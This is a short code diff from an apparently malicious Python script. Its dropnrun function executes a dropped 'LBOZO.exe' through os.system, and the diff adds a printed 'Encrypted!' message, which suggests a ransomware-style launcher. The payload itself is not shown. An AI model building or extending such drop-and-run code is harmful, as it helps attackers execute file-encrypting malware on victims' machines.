@@ -16,6 +16,8 @@ def dropnrun(programname):
     command = "{}".format(f"{finaldest}/LBOZO.exe")
     print(command)
     os.system(command)
+    print("Encrypted!")
+
 
 
 dropnrun("LBOZO")
